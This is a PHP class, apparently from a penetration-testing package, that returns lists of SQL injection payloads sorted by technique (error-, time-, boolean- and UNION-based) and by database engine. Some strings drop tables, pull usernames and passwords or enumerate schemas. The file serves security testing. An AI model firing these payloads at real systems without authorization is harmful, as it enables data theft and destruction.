<?php

declare(strict_types=1);

namespace ArtisanPackUI\Security\Testing\PenetrationTesting\Payloads;

class SqlPayloads
{
    /**
     * Get all SQL injection payloads.
     *
     * @return array<string>
     */
    public static function getAll(): array
    {
        return array_merge(
            self::getErrorBased(),
            self::getTimeBased(),
            self::getBooleanBased(),
            self::getUnionBased(),
        );
    }

    /**
     * Get error-based SQL injection payloads.
     *
     * @return array<string>
     */
    public static function getErrorBased(): array
    {
        return [
            "'",
            '"',
            "' OR '1'='1",
            "' OR '1'='1'--",
            "' OR '1'='1'/*",
            "' OR '1'='1'#",
            "1' ORDER BY 1--+",
            "1' ORDER BY 2--+",
            "1' ORDER BY 3--+",
            "1' UNION SELECT NULL--",
            "admin'--",
            "admin'#",
            "') OR ('1'='1",
            "' OR 1=1--",
            "' OR 'x'='x",
            '" OR "x"="x',
            "' AND '1'='1",
            "1' AND '1'='2",
            '1 OR 1=1',
            "1' OR '1'='1",
            "'; DROP TABLE users--",
            '1; DROP TABLE users',
            "' UNION SELECT * FROM users--",
            "1' AND EXTRACTVALUE(0,CONCAT(0x7e,VERSION()))--",
        ];
    }

    /**
     * Get time-based blind SQL injection payloads.
     *
     * @return array<string>
     */
    public static function getTimeBased(): array
    {
        return [
            "' OR SLEEP(5)--",
            "'; WAITFOR DELAY '0:0:5'--",
            "' OR pg_sleep(5)--",
            "1' AND SLEEP(5)#",
            '1; SELECT SLEEP(5)',
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "1' AND BENCHMARK(5000000,SHA1('test'))--",
            "'; SELECT DBMS_PIPE.RECEIVE_MESSAGE('a',5) FROM DUAL--",
            "1;WAITFOR DELAY '0:0:5'--",
        ];
    }

    /**
     * Get boolean-based blind SQL injection payloads.
     *
     * @return array<string>
     */
    public static function getBooleanBased(): array
    {
        return [
            "' AND '1'='1",
            "' AND '1'='2",
            '1 AND 1=1',
            '1 AND 1=2',
            "1' AND 1=1--",
            "1' AND 1=2--",
            "1' AND SUBSTRING(@@version,1,1)='5'--",
            "1' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--",
        ];
    }

    /**
     * Get UNION-based SQL injection payloads.
     *
     * @return array<string>
     */
    public static function getUnionBased(): array
    {
        return [
            "' UNION SELECT 1--",
            "' UNION SELECT 1,2--",
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT 1,2,3,4--",
            "' UNION SELECT 1,2,3,4,5--",
            "' UNION ALL SELECT NULL,NULL--",
            "' UNION ALL SELECT NULL,NULL,NULL--",
            "' UNION SELECT @@version--",
            "' UNION SELECT user()--",
            "' UNION SELECT database()--",
            '0 UNION SELECT 1,2,3,4,5--',
            "1' UNION SELECT username,password FROM users--",
        ];
    }

    /**
     * Get MySQL-specific payloads.
     *
     * @return array<string>
     */
    public static function getMySql(): array
    {
        return [
            "' AND EXTRACTVALUE(0,CONCAT(0x7e,VERSION()))--",
            "' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--",
            "' AND EXP(~(SELECT * FROM (SELECT USER())a))--",
            "' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(@@version)) USING utf8)))--",
        ];
    }

    /**
     * Get PostgreSQL-specific payloads.
     *
     * @return array<string>
     */
    public static function getPostgreSql(): array
    {
        return [
            "'; SELECT version()--",
            "' AND 1=CAST((SELECT version()) AS INTEGER)--",
            "' AND 1=CAST((SELECT current_database()) AS INTEGER)--",
        ];
    }

    /**
     * Get SQLite-specific payloads.
     *
     * @return array<string>
     */
    public static function getSqlite(): array
    {
        return [
            "' AND sqlite_version()='3",
            "' UNION SELECT sql FROM sqlite_master--",
            "' UNION SELECT name FROM sqlite_master WHERE type='table'--",
        ];
    }
}
